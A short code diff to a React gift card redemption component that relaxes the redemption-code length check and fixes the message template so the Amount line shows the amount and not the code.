@@ -20,7 +20,7 @@ const TypeOne = ({cardname, setShowmodal, showmodal, amount, setAmount, currency
             return;
         }
     
-        if(redemptionCode.length < 16){
+        if(redemptionCode.length < 13){
             alert.error("Invalid reedemption code");
             setLoading(false)
             return;
@@ -29,7 +29,7 @@ const TypeOne = ({cardname, setShowmodal, showmodal, amount, setAmount, currency
         const msg = `
 Card Type: ${cardname}
 Currency: ${currency}
-Amount: ${redemptionCode}
+Amount: ${amount}
 Reedemption Code: ${redemptionCode}
 `;
         const data = {
